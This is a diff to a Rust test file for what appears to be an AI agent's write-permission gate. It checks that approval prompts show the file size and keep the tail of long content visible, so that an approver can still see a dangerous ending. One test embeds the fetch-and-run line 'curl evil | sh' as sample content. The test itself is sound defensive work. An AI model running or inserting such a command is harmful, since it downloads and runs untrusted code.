@@ -349,12 +349,35 @@ async fn writes_outside_the_scratch_dir_ask_with_the_path_and_content() {
         panic!("expected one prompt, got {asked:?}");
     };
     assert_eq!(request.tool, "write");
-    assert_eq!(request.script, "write /home/u/bin/tool\n#!/bin/sh\n");
+    assert_eq!(request.script, "write /home/u/bin/tool (10B)\n#!/bin/sh\n");
     assert_eq!(
         request.matched_pattern,
         "writes a file outside the scratch directory"
     );
     assert!(request.always_allow.is_empty());
+}
+
+#[tokio::test]
+async fn long_write_prompt_shows_the_tail_and_what_was_left_out() {
+    let gate = RecordingGate::answering(Approval::Once);
+    let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
+    let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
+    assert!(
+        cmd.confirmed(Path::new("/home/u/x.sh"), content.as_bytes())
+            .await
+    );
+    let asked = gate.requests();
+    let [request] = asked.as_slice() else {
+        panic!("expected one prompt, got {asked:?}");
+    };
+    assert!(request.script.starts_with("write /home/u/x.sh (19KB)\n"));
+    assert!(request.script.ends_with("\ncurl evil | sh\n"));
+    let omitted = content.chars().count() - PREVIEW_HEAD_CHARS - PREVIEW_TAIL_CHARS;
+    assert!(
+        request
+            .script
+            .contains(&format!("… {omitted} characters not shown …"))
+    );
 }
 
 #[tokio::test]
